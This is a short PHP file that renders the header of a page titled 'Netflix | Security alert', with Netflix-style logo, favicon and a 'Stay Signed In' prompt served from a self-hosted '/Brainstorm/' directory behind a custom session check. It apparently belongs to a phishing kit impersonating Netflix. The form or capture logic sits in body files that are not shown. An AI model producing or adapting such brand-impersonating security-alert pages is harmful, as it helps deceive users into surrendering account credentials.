<?php
function security() {
    if (!isset($_SESSION['KYS-SECURITY'])) {
        die('ERROR: Please log in first.');
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Netflix | Security alert</title>
        <link rel="stylesheet" href="/Brainstorm/assets/css/karma-styles.css?v=<?php echo time(); ?>">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.10.0/font/bootstrap-icons.min.css" rel="stylesheet">
        <meta name="apple-touch-icon" content="/Brainstorm/assets/images/net-152.jpg">
        <link rel="shortcut icon" href="/Brainstorm/assets/images/favicon.ico">
        <link rel="apple-touch-icon" href="/Brainstorm/assets/images/favicon.png">
    </head>
    <body>
        <header>
            <nav>
                <ul>
                    <img src="/Brainstorm/assets/images/logo.svg">
                    <li><a id="sign-out">Sign Out</a></li>
                    <div id="overlay" style="display: none;"></div>
                    <div id="toast-notification">
                        <div id="toast-message"></div>
                        <button id="toast-button">Stay Signed In</button>
                    </div>
                </ul>
            </nav>
        </header>

        <?php
        require_once 'security-body.php';
        require_once 'security-footer.php';
    }
?>